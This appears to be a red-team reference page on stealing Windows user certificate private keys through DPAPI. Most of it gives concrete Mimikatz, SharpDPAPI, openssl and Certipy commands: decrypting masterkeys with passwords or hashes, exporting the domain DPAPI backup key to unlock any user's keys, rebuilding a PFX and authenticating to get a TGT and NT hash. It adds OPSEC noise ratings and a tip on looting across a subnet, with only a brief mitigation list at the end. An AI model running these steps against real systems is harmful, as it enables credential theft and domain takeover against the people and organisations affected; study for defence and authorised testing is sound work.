---
title: "THEFT2 — User Certificate Theft via DPAPI"
description: "Windows protects user certificate private keys with DPAPI (Data Protection API). The encrypted key blobs live on disk; decrypting them normally requires…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "hashing"]
tools: ["Mimikatz", "Certipy", "OpenSSL", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/THEFT2 — User Certificate Theft via DPAPI.md"
---
# THEFT2 — User Certificate Theft via DPAPI

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Credential Theft (local, DPAPI) |
| **Difficulty** | Medium |
| **Pre-requisites** | Access as the user (or their password/hash, or the domain DPAPI backup key) |
| **Tools** | SharpDPAPI, Mimikatz, Certipy, DonPAPI |
| **OPSEC Noise** | Low — file reads + offline decryption |
| **One-liner** | Decrypt a user's certificate private keys straight from the DPAPI-protected files on disk, without going through the certificate-store export APIs. |

***

## What Is THEFT2?

Windows protects user certificate private keys with **DPAPI** (Data Protection API). The encrypted key blobs live on disk; decrypting them normally requires the user's logon secret. If you can read those files **and** obtain the DPAPI masterkey (via the user's password/NT hash, an existing logon session, or the domain's DPAPI backup key), you recover the private key offline, even when THEFT1's export APIs are blocked.

**Key locations (per user):**

```
Private keys : %APPDATA%\Microsoft\Crypto\RSA\<SID>\
               %APPDATA%\Microsoft\Crypto\Keys\        (CNG)
Masterkeys   : %APPDATA%\Microsoft\Protect\<SID>\
Certificates : %APPDATA%\Microsoft\SystemCertificates\My\Certificates\
```

***

## Step 1 — Decrypt the Masterkey

```powershell
# From a live session as the user (Mimikatz auto-uses the logon secret)
mimikatz # dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<GUID>" /rpc

# With the user's password or NT hash (offline)
mimikatz # dpapi::masterkey /in:<masterkeyfile> /sid:<SID> /password:Passw0rd!
mimikatz # dpapi::masterkey /in:<masterkeyfile> /sid:<SID> /hash:<NTHASH>
```

> [!tip] Domain DPAPI backup key = master skeleton
> If you are Domain Admin, extract the domain DPAPI backup key once (`lsadump::backupkeys /system:DC01 /export`) and decrypt **any** user's masterkeys forever: `dpapi::masterkey /in:<mk> /pvk:backupkey.pvk`.

***

## Step 2 — Decrypt the Private Key + Rebuild the PFX

```powershell
# One-shot: SharpDPAPI finds certs, decrypts masterkeys, outputs .pem/.pfx
SharpDPAPI.exe certificates /mkfile:masterkeys.txt        # provide decrypted masterkeys
SharpDPAPI.exe certificates /pvk:backupkey.pvk            # or the domain backup key
```

```powershell
# Mimikatz manual path
mimikatz # dpapi::capi /in:"%APPDATA%\Microsoft\Crypto\RSA\<SID>\<keyfile>"
# combine the recovered key with the public cert into a pfx with openssl
```

```bash
# openssl: stitch the decrypted key + cert into a usable pfx
openssl pkcs12 -export -inkey stolen.key -in stolen.crt -out stolen.pfx
```

***

## Step 3 — Authenticate

```bash
certipy-ad auth -pfx stolen.pfx -dc-ip $TARGET      # PKINIT -> TGT + NT hash
```

> [!tip] DonPAPI / Certipy remote
> `DonPAPI` automates remote DPAPI cert looting across many hosts. Handy when sweeping a subnet after gaining a domain foothold.

***

## OPSEC Considerations

| Action | Artefact | Noise |
| :-- | :-- | :-- |
| Reading Crypto/Protect files | file access events (if audited) | 🟢 Low |
| Offline masterkey decryption | none (off-host) | 🟢 Low |
| `lsadump::backupkeys` on DC | LSASS access on DC | 🔴 High |

***

## Mitigation

- Protect keys with TPM/HSM so DPAPI blobs alone are useless.
- Rotate the **domain DPAPI backup key** if DA compromise is suspected (non-trivial).
- Limit lateral movement so attackers cannot read other users' profiles.
- Monitor DC access to `lsadump::backupkeys` behaviour and mass profile reads.

***

## See Also

- _ADCS Attack Methodology Guide · THEFT1 — Exporting Certificates and Keys · THEFT3 — Machine Certificate Theft via DPAPI
- Sources: SpecterOps *Certified Pre-Owned*; [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
